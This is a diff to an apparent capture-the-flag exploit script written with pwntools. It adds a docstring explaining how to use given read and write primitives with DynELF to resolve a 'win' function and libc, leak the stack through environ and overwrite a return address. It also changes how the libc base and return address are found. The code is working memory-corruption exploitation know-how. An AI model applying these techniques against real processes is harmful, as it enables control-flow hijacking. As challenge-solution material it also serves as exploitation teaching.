@@ -3,6 +3,38 @@
  
 from pwn import *
 
+
+"""
+We are given r/w functions, and a random pointer into libwin.so, which
+contains a win function at a random address that we must call.
+
+The easiest way to use this is to use pwntools DynELF class to first
+dynamically resolve the address of win, then resolve the base address
+of libc. Now we can use that leak to resolve `environ` in libc to give us
+a stack leak. Simply writing the address of win to the stack causes an
+alignment issue, so we first write the address of the function we are
+originally provided, then win.
+
+
+At a high level, this dynamic resolution can be achieved like so:
+
+    1. Read down page boundaries from the leak until we find the ELF
+    magic bytes.
+    2. Read through ELF headers to find the .symtab and .strtab sections
+    3. Iterate over the .symtab entries. Each symbol has an st_name field, 
+    which can be used to index into the .strtab to compare against the symbol
+    you are resolving.
+    4. The st_value for the corresponding symbol will be the relative
+    address of the resolved symbol in the binary.
+
+Check out the pwntools source for more details!
+
+"""
+
+
+
+
+
 if len(sys.argv) > 2:
     is_remote = True
     if len(sys.argv) == 3:
@@ -51,12 +83,12 @@ x = read(leak)
 libwin_resolver = DynELF(read,leak)
 libwin_base = libwin_resolver.lookup()
 win = libwin_resolver.lookup("win")
-libc_probably = libwin_base - 0x180000
+libc_probably = libwin_resolver.lookup(None, "libc")
 libc_resolver = DynELF(read,libc_probably)
 libc_base = libc_resolver.lookup()
 environ = libc_resolver.lookup("environ")
 stack_leak = u64(read(environ))
-ret = libc_base + 0x0000000000029139
+ret = leak
 info(f"stack leak: {hex(stack_leak)}")
 target = stack_leak - 0x120
 
